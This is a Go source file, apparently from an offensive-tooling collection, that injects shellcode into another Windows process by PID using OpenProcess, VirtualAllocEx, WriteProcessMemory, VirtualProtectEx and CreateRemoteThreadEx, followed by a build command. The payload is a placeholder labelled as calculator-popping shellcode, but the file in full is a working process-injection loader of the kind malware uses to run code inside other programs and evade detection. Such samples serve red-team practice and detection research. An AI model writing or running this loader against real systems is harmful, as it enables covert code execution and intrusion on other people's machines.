package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

func main() {

	// To hardcode the Process Identifier (PID), change 0 to the PID of the target process
	pid := 121

	// Pop Calc Shellcode
	shellcode, errShellcode := hex.DecodeString("xxx")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	OpenProcess := kernel32.NewProc("OpenProcess")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
	CloseHandle := kernel32.NewProc("CloseHandle")

	pHandle, _, errOpenProcess := OpenProcess.Call(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0, uintptr(uint32(pid)))

	if errOpenProcess != nil && errOpenProcess.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess.Error()))
	}

	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}

	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}

	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}

	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx:\r\n%s", errCreateRemoteThreadEx.Error()))
	}

	_, _, errCloseHandle := CloseHandle.Call(uintptr(uint32(pHandle)))
	if errCloseHandle != nil && errCloseHandle.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
	}

}

// export GOOS=windows GOARCH=amd64;go build -o goCreateRemoteThreadNative.exe cmd/CreateRemoteThreadNative/main.go
